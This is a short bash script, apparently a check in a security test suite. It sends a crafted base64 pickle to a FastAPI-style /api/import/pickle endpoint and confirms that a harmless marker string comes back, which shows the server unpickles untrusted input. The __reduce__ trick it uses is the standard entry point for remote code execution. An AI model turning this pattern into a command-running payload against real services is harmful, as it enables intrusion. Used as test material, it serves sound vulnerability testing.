#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
blob=$(python3 - <<'PY'
import base64,pickle
class P:
    def __reduce__(self):
        return (str, ('FASTAPI_PICKLE_42',))
print(base64.b64encode(pickle.dumps(P())).decode())
PY
)
curl -s -X POST "$TARGET/api/import/pickle" -H 'content-type: application/json' -d "{\"blob\":\"$blob\"}" | grep -q 'FASTAPI_PICKLE_42'
